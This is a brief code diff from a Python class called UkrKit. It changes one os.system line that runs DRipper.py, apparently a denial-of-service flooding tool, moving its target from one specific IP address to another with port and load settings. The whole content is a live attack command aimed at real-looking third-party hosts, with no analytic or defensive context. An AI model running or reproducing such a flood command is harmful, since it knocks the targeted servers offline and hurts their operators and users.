@@ -45,7 +45,7 @@ class UkrKit(object):
         #fail_num = 0
 
         #while True:
-        os.system("python DRipper.py -s 194.54.14.131 -p 80 -t 443 -q 10000")
+        os.system("python DRipper.py -s 195.19.96.198 -p 80 -t 443 -q 10000")
 
         #while True:
         #    try:
